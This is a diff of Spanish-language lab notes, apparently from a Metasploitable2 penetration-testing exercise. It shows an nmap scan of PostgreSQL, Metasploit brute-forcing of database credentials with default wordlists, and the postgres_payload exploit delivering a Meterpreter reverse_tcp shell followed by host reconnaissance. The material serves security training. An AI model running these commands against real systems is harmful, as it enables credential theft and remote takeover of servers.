@@ -314,24 +314,22 @@ nmap -sV -p 5432 <IP_VICTIMA>
 
 # 2. Iniciar msfconsole
 msfconsole
+search postgres type:auxiliary
 
 # 3. Fuerza bruta de credenciales PostgreSQL
 use auxiliary/scanner/postgres/postgres_login
 set USER_FILE /usr/share/metasploit-framework/data/wordlists/postgres_default_user.txt
 set PASS_FILE /usr/share/metasploit-framework/data/wordlists/postgres_default_pass.txt
-set VERBOSE false
-run
+exploit
 
-# 4. Una vez obtenidas las credenciales (postgres:postgres), conectarse
-#    y obtener sesión interactiva con Meterpreter
-#    NOTA: En Metasploitable2, las credenciales son postgres:postgres
+search postgres type:exploit
+# 4. Una vez obtenidas las credenciales, conectarse
 use exploit/linux/postgres/postgres_payload
 set USERNAME postgres
 set PASSWORD postgres
 set DATABASE template1
 set payload linux/x86/meterpreter/reverse_tcp
-set LHOST <IP_ATACANTE>
-set LPORT 4444
+
 exploit
 
 # 5. Una vez obtenida la sesión Meterpreter, identificar:
@@ -339,14 +337,12 @@ getuid          # Usuario actual
 sysinfo         # Sistema operativo
 ifconfig        # Interfaces de red
 
-# 6. Alternativa: desde la shell de PostgreSQL
-sessions -i <ID>
-query 'SELECT version();'
-query 'SELECT inet_server_addr();'
 ```
 
 ![](attachments/{6D6DE5B3-9789-40B9-8D69-C63462B0FEE4}.png)
-
+![](attachments/{5545ECE0-2813-42C6-9268-C73BBFEA21BB}.png)
+![](attachments/{91495CF9-62AB-48F9-8CA2-230DA2DDBC40}.png)
+![](attachments/{B0942F80-E03B-4A62-B91F-DE299539FBBC}.png)
 ## Ejercicio 8 — Módulos auxiliares — FTP y VNC Server
 
 ### FTP — Fuerza bruta
